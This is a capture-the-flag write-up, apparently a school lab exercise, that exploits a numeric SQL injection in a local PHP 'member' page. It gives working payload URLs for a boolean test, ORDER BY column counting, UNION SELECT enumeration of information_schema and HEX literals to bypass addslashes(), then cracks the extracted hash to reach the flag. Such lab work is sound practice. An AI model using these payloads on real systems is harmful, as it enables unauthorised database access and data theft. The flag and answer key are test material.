# SQL Injection Basic — Writeup

**Page:** `index.php?page=member` (form "Search member by ID", method `GET`, parameter `id`)
**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Mechanism

The `id` parameter is inserted directly into a SQL query with no escaping and no type check, even though a number is expected:

```sql
SELECT first_name, last_name FROM users WHERE id = <user input>
```

Because `id` is numeric, there are no quotes around it in the query, so the quote-escaping used elsewhere on the site does nothing here. The whole injection is built without a single quote (`or 1=1`, `union select`, HEX literals instead of quoted strings).

## Reproduction

**1. Confirm the injection** — normal request returns one row, injection returns all rows:

```
http://127.0.0.1:8080/index.php?page=member&id=0+or+1=1&Submit=Submit
```

Returns 4 rows instead of one, including `First name: Flag`, `Surname: GetThe`.

**2. Count columns with ORDER BY:**

```
http://127.0.0.1:8080/index.php?page=member&id=1+order+by+3&Submit=Submit
```

`order by 3` fails with `Unknown column '3' in 'order clause'`, so the query returns exactly 2 columns.

**3. List tables:**

```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+table_name,2+from+information_schema.tables+where+table_schema=database()&Submit=Submit
```

Only table found: `users`.

**4. List columns of `users`** — the quote in `'users'` is blocked by `addslashes()`, so the string is passed as HEX (`0x7573657273`) to avoid quotes entirely:

```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+column_name,2+from+information_schema.columns+where+table_name=0x7573657273&Submit=Submit
```

Columns: `user_id, first_name, last_name, town, country, planet, Commentaire, countersign` (the site only shows `first_name` and `last_name`).

**5. Extract the hidden data** — `'Flag'` also passed as HEX (`0x466c6167`):

```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+Commentaire,countersign+from+users+where+first_name=0x466c6167&Submit=Submit
```

Result:

```
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
```

**6. Turn countersign into the flag** — it is an MD5 hash; the comment tells us the recipe:

```
5ff9d0165b4f92b14994e5c685cdce28  =  MD5("FortyTwo")
"FortyTwo" -> lowercase -> "fortytwo"
SHA256("fortytwo") = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Flag comparison

Flag obtained through exploitation:

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

Compared byte-for-byte with the `flag` file in the submission folder during the defense (`cat member/flag | cat -e`).
